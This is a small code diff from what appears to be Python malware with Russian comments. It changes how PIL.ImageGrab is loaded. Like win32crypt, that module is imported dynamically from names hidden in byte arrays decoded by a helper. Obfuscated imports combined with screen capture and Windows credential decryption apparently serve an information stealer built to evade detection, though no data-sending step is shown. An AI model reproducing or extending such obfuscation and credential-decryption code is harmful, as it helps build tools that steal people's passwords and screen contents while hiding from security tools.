@@ -32,8 +32,7 @@ import win32com.client
 from Crypto.Cipher import AES
 
 # PIL.ImageGrab — динамически
-_PIL_mod   = importlib.import_module(_d([250, 227, 230]))           # PIL
-ImageGrab  = getattr(_PIL_mod, _d([227, 199, 203, 205, 207, 237, 216, 203, 200]))  # ImageGrab
+ImageGrab  = importlib.import_module(_d([250, 227, 230]) + '.' + _d([227, 199, 203, 205, 207, 237, 216, 203, 200]))  # PIL.ImageGrab
 
 # win32crypt — динамически
 _wc32      = importlib.import_module(_d([221, 195, 196, 153, 152, 201, 216, 211, 218, 222]))  # win32crypt
